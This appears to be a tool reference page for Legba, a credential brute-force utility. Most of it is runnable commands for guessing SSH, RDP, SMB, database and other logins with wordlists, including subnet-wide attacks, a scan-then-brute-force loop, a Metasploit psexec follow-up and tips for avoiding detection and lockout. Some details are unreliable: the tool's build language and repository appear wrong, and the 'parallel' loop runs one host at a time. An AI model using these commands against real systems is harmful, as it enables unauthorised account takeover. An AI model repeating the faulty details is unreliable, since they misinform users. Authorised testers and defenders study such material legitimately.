---
title: "Legba - Credential Brute-Force Tool"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Brute Force"
  - "Credential Access"
  - "Network Attacks"
tags:
  - "legba"
  - "brute-force"
  - "password-cracking"
  - "multi-protocol"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Brute Force
mitre_technique_id: T1110
version: "latest"
tool_url: "https://github.com/ctxii/legba"
kali_url: "https://www.kali.org/tools/legba/"
license: "MIT"
---

# Legba - Credential Brute-Force Tool

## Overview

**Legba** is a multi-protocol credential brute-force tool designed for penetration testing and security assessments. It provides a unified interface for attacking various network services with support for multiple authentication methods and attack strategies.

**Key Features**:
- **Multi-protocol support** - SSH, RDP, FTP, HTTP, MySQL, and more
- **Flexible input** - Multiple ways to specify targets, usernames, passwords
- **Session management** - Resume interrupted attacks
- **Rate limiting** - Built-in delays to avoid detection
- **JSON output** - Machine-readable output for integration
- **Extensible design** - Easy to add new protocols

**Supported Protocols**:
- **Remote Access**: SSH, RDP, Telnet, VNC
- **Web**: HTTP, HTTPS (GET, POST, FORM)
- **Email**: SMTP, POP3, IMAP
- **Database**: MySQL, MSSQL, PostgreSQL, Oracle
- **File Transfer**: FTP, SMB
- **Directory**: LDAP, SNMP
- **Other**: SIP, Redis, MongoDB

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y legba
```

### From Source

```bash
# Install dependencies
sudo apt install -y golang-go

# Clone and build
git clone https://github.com/ctxii/legba
cd legba
go build -o legba
sudo cp legba /usr/local/bin/
```

### Docker

```bash
docker pull ctxii/legba
docker run -it ctxii/legba
```

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `--target` | Target host or IP |
| `--port` | Target port |
| `--protocol` | Protocol to attack |
| `--username` | Single username |
| `--usernames` | Username list file |
| `--password` | Single password |
| `--passwords` | Password list file |
| `--combo` | Combo file (user:pass) |
| `--threads` | Number of threads (default: 1) |
| `--timeout` | Connection timeout (default: 10s) |
| `--delay` | Delay between attempts (default: 0s) |
| `--retries` | Number of retries (default: 3) |
| `--output` | Output file |
| `--format` | Output format: text, json |
| `--resume` | Resume from previous session |
| `--verbose` | Verbose output |
| `--debug` | Debug mode |

### Protocol-Specific Options

```bash
# View protocol-specific options
legba --help

# Example: SSH options
legba --protocol ssh --help

# Example: HTTP options
legba --protocol http --help
```

## Usage Examples

### SSH Brute Force

**Single User, Password List**:
```bash
legba --target 192.168.1.100 --protocol ssh --username root --passwords /usr/share/wordlists/rockyou.txt
```

**User List, Password List**:
```bash
legba --target 192.168.1.100 --protocol ssh --usernames usernames.txt --passwords passwords.txt
```

**Custom Port**:
```bash
legba --target 192.168.1.100 --port 2222 --protocol ssh --username admin --passwords passwords.txt
```

### RDP Brute Force

```bash
legba --target 192.168.1.100 --protocol rdp --username administrator --passwords passwords.txt
```

### FTP Brute Force

```bash
legba --target 192.168.1.100 --protocol ftp --username admin --passwords passwords.txt
```

### HTTP Brute Force

**Basic Authentication**:
```bash
legba --target 192.168.1.100 --protocol http --username admin --passwords passwords.txt
```

**Form-Based Authentication**:
```bash
legba --target 192.168.1.100 --protocol http --username admin --passwords passwords.txt --url /login.php
```

### MySQL Brute Force

```bash
legba --target 192.168.1.100 --protocol mysql --username root --passwords passwords.txt
```

### MSSQL Brute Force

```bash
legba --target 192.168.1.100 --protocol mssql --username sa --passwords passwords.txt
```

### PostgreSQL Brute Force

```bash
legba --target 192.168.1.100 --protocol postgres --username postgres --passwords passwords.txt
```

### SMB Brute Force

```bash
legba --target 192.168.1.100 --protocol smb --username administrator --passwords passwords.txt
```

### LDAP Brute Force

```bash
legba --target 192.168.1.100 --protocol ldap --username "cn=admin,dc=example,dc=com" --passwords passwords.txt
```

### VNC Brute Force

```bash
legba --target 192.168.1.100 --protocol vnc --passwords passwords.txt
```

### SNMP Brute Force

```bash
legba --target 192.168.1.100 --protocol snmp --username public --passwords passwords.txt
```

### Combo File Attack

**Create Combo File**:
```bash
# Format: user:pass
echo "admin:password123" > combo.txt
echo "root:toor" >> combo.txt
```

**Attack with Combo File**:
```bash
legba --target 192.168.1.100 --protocol ssh --combo combo.txt
```

### Multiple Targets

**From File**:
```bash
legba --target-file targets.txt --protocol ssh --username root --passwords passwords.txt
```

**CIDR Notation**:
```bash
legba --target 192.168.1.0/24 --protocol ssh --username root --passwords passwords.txt
```

### Rate Limiting

```bash
# Add delay between attempts
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --delay 5

# Reduce thread count
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --threads 1
```

### Session Management

**Resume Interrupted Session**:
```bash
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --resume session.json
```

**Save Session**:
```bash
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --output results.json
```

### Output Formats

**JSON Output**:
```bash
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --output results.json --format json
```

**Text Output**:
```bash
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --output results.txt --format text
```

## Output Interpretation

### Successful Login

```
[+] Found valid credentials: root:password123
```

### Failed Attempt

```
[-] Invalid credentials: root:wrongpass
```

### JSON Output Example

```json
{
    "target": "192.168.1.100",
    "protocol": "ssh",
    "port": 22,
    "credentials": [
        {
            "username": "root",
            "password": "password123"
        }
    ],
    "timestamp": "2024-01-15T14:30:22Z"
}
```

## Integration with Other Tools

### Nmap + Legba Workflow

```bash
# 1. Find services
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oG - > services.txt

# 2. Extract targets per service
grep "22/open" services.txt | awk '{print $2}' > ssh_hosts.txt

# 3. Brute force
for host in $(cat ssh_hosts.txt); do
    legba --target $host --protocol ssh --username root --passwords passwords.txt
done
```

### Metasploit Integration

```bash
# After finding credentials with Legba
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser admin; set SMBPass password123; exploit"
```

## Operational Security

### Rate Limiting

```bash
# Add delay between attempts
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --delay 10

# Reduce thread count
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --threads 1
```

### Logging

```bash
# Enable verbose output
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --verbose

# Log to file
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --output results.txt
```

## Common Issues and Troubleshooting

### Issue: "Connection refused"

**Cause**: Service not running or firewall blocking.

**Solution**:
```bash
# Verify service is running
nmap -p 22 192.168.1.100

# Test connection manually
ssh root@192.168.1.100
```

### Issue: "No credentials found"

**Cause**: Strong passwords or account lockout.

**Solution**:
```bash
# Try different wordlist
legba --target 192.168.1.100 --protocol ssh --username root --passwords /usr/share/wordlists/rockyou.txt

# Add delay to avoid lockout
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --delay 10
```

### Issue: "Too many connections"

**Cause**: Target limiting connections.

**Solution**:
```bash
# Reduce thread count
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --threads 1

# Add delay
legba --target 192.168.1.100 --protocol ssh --username root --passwords passwords.txt --delay 5
```

### Issue: "SSL certificate errors"

**Cause**: Self-signed or invalid SSL certificates.

**Solution**:
```bash
# Try different SSL options
legba --target 192.168.1.100 --protocol https --username admin --passwords passwords.txt
```

## Best Practices

### Wordlist Preparation

```bash
# Use rockyou.txt
cat /usr/share/wordlists/rockyou.txt | head -10000 > top10k.txt

# Create targeted wordlist
cewl -d 2 -m 5 http://target.com -w target_wordlist.txt

# Combine wordlists
cat /usr/share/wordlists/rockyou.txt target_wordlist.txt | sort -u > combined.txt
```

### Combo File Format

```bash
# Create combo file (user:pass)
echo "admin:password123" > combo.txt
echo "root:toor" >> combo.txt

# Use combo file
legba --target 192.168.1.100 --protocol ssh --combo combo.txt
```

### Parallel Attacks

```bash
# Attack multiple hosts simultaneously
for host in $(cat targets.txt); do
    legba --target $host --protocol ssh --username root --passwords passwords.txt
done
```

## Resources

- **GitHub Repository**: https://github.com/ctxii/legba
- **Kali Linux Tools**: https://www.kali.org/tools/legba/
- **License**: MIT

## Related Tools

- **Hydra**: More protocol support, faster for standard protocols
- **Medusa**: Modular design, good for parallel testing
- **Patator**: Advanced features, more flexible but complex
- **Ncrack**: Network authentication cracking, good for large-scale audits
